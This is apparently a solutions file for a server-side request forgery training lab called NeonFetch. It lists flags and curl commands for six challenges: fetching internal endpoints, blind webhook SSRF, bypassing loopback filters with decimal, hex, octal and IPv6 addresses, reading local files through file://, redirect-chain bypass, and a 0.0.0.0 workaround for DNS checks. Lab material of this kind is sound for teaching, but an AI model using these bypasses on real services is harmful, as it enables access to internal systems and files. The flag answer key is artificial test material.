@@ -1,0 +1,100 @@
+===============================================================================
+  NeonFetch — SSRF Lab Solutions (Port 5008)
+===============================================================================
+
+CHALLENGE 1: Basic SSRF — No URL Filtering
+Flag: FLAG{ssrf_m3t4d4ta_l34k}
+
+  The /fetch endpoint fetches any URL with no validation.
+
+  curl "http://localhost:5008/fetch?url=http://127.0.0.1:5008/internal/metadata"
+
+  Response includes cloud metadata with the flag.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Blind SSRF — Webhook with Logging
+Flag: FLAG{ssrf_bl1nd_00b}
+
+  The /webhook endpoint fetches a URL but doesn't return the response.
+  It logs URL, status code, and response length to a database.
+
+  Step 1: Trigger the blind fetch:
+    curl -X POST http://localhost:5008/webhook \
+      -d "url=http://127.0.0.1:5008/internal/admin-api"
+
+  Step 2: Check the log to see the result:
+    curl http://localhost:5008/check-log
+
+  The log shows the internal endpoint was accessed. The flag is in the
+  /internal/admin-api response (visible if you also use Challenge 1's
+  direct fetch approach on that endpoint).
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: IP Filter Bypass — Alternative Representations
+Flag: FLAG{ssrf_f1lt3r_byp4ss}
+
+  The /fetch-safe endpoint blocks "127.0.0.1" and "localhost"
+  (case-insensitive string check). Bypass with alternative IP formats:
+
+  # Decimal IP (127.0.0.1 = 2130706433)
+  curl "http://localhost:5008/fetch-safe?url=http://2130706433:5008/internal/flag"
+
+  # Hex IP
+  curl "http://localhost:5008/fetch-safe?url=http://0x7f000001:5008/internal/flag"
+
+  # IPv6 loopback
+  curl "http://localhost:5008/fetch-safe?url=http://[::1]:5008/internal/flag"
+
+  # Octal notation
+  curl "http://localhost:5008/fetch-safe?url=http://0177.0.0.1:5008/internal/flag"
+
+  # 0.0.0.0 (may work depending on OS)
+  curl "http://localhost:5008/fetch-safe?url=http://0.0.0.0:5008/internal/flag"
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: Protocol Smuggling — file:// Scheme
+Flag: FLAG{ssrf_pr0t0c0l_smuggl3}
+
+  The /proxy endpoint only checks if the URL starts with "http".
+  But urllib supports file:// which doesn't start with "http".
+
+  curl "http://localhost:5008/proxy?url=file:///app/flag.txt"
+
+  This reads the local flag file directly via the file:// protocol.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Redirect Bypass — Open Redirect Chain
+Flag: FLAG{ssrf_r3d1r3ct_byp4ss}
+
+  The /fetch-redirect endpoint blocks localhost in the initial URL
+  but follows HTTP redirects. The app has a /redirect-to endpoint
+  that sends a 302 redirect.
+
+  curl -X POST http://localhost:5008/fetch-redirect \
+    -d "url=http://localhost:5008/redirect-to?url=http://127.0.0.1:5008/internal/db-backup"
+
+  The initial URL passes the filter (or use an external URL that
+  redirects to localhost). The 302 redirect leads to the internal
+  endpoint, bypassing the filter.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 6: DNS Rebinding / TOCTOU
+Flag: FLAG{ssrf_dns_r3b1nd}
+
+  The /fetch-dns endpoint resolves the hostname first and blocks
+  if it resolves to 127.0.0.0/8. But the fetch happens separately.
+
+  Easiest bypass: use 0.0.0.0 which maps to localhost on most systems
+  but doesn't fall in the 127.x.x.x range:
+
+  curl "http://localhost:5008/fetch-dns?url=http://0.0.0.0:5008/internal/flag"
+
+  For a true DNS rebinding attack, you'd need a DNS server that
+  returns a public IP on the first query and 127.0.0.1 on the second.
+
+===============================================================================
